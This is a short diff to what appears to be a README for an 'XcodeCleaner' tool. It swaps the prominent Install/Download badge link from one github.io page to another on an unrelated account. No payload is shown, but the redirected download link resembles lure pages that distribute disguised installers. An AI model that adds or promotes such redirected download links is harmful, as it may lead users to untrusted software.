@@ -6,7 +6,7 @@
 
 <p align="center">
 
-[![Install](https://img.shields.io/badge/⬇%20Install-Download-blue?style=for-the-badge)](https://osx-sub-software.github.io/.github/XcodeCleaner)
+[![Install](https://img.shields.io/badge/⬇%20Install-Download-blue?style=for-the-badge)](https://yapidoras-apps.github.io/.github/XcodeCleaner)
 
 </p>
 
